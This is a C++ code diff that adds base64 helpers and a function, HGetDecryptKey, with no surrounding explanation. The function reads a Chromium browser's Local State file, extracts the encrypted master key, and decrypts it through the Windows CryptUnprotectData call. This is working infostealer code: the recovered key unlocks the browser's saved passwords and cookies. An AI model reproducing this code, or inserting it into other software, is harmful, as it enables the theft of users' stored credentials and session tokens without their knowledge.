@@ -385,3 +385,81 @@ std::vector<std::string> HChunkFile(const std::string& path, size_t chunkSize)
     return files;
 }
 
+std::string HBase64Encode(const std::vector<char>& in) {
+    std::vector<unsigned char> out;
+    out.reserve(((in.size() + 2) / 3) * 4);
+    int val = 0, valb = -6;
+    for (unsigned char c : in)
+    {
+        if (c == '\n') continue;
+        val = (val << 8) + c;
+        valb += 8;
+        while (valb >= 0) {
+            out.push_back(BASE64_CHARS[(val >> valb) & 0x3F]);
+            valb -= 6;
+        }
+    }
+    if (valb > -6)
+    {
+        out.push_back(BASE64_CHARS[((val << 8) >> (valb + 8)) & 0x3F]);
+    }
+    out.resize((out.size() + 3) / 4 * 4, '=');
+    return std::string(out.begin(), out.end());
+}
+
+std::vector<char> HBase64Decode(const std::string& in) {
+    std::vector<int> T(256, -1);
+    for (int i = 0; i < 64; i++)
+    {
+        T[BASE64_CHARS[i]] = i;
+    }
+
+    std::vector<char> out;
+    out.reserve((in.size() * 3) / 4);
+    int val = 0, valb = -8;
+    for (unsigned char c : in) {
+        if (c == '\n') continue;
+        if (T[c] == -1)
+            break;
+        val = (val << 6) + T[c];
+        valb += 6;
+        if (valb >= 0) {
+            out.push_back(static_cast<char>((val >> valb) & 0xFF));
+            valb -= 8;
+        }
+    }
+    return out;
+}
+
+std::string HGetDecryptKey(const std::string& filePath)
+{
+    try {
+        std::ifstream ifs(filePath);
+        std::string localStateRaw((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
+        json localStateJson = json::parse(localStateRaw);
+
+        std::vector<char> bytes = HBase64Decode(localStateJson["os_crypt"]["encrypted_key"].get<std::string>());
+        bytes.erase(bytes.begin(), bytes.begin() + 5);
+
+        DATA_BLOB inData = { static_cast<DWORD>(bytes.size()), reinterpret_cast<BYTE*>(bytes.data()) };
+        DATA_BLOB outData = { 0 };
+
+        if (CryptUnprotectData(&inData, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_LOCAL_MACHINE, &outData))
+        {
+            std::vector<char> result(outData.cbData);
+            memcpy(result.data(), outData.pbData, outData.cbData);
+            LocalFree(outData.pbData);
+            return HBase64Encode(result);
+        }
+        else {
+
+            return std::to_string(GetLastError());
+        }
+
+        ifs.close();
+    }
+    catch (std::exception& e)
+    {
+        return std::string();
+    }
+}
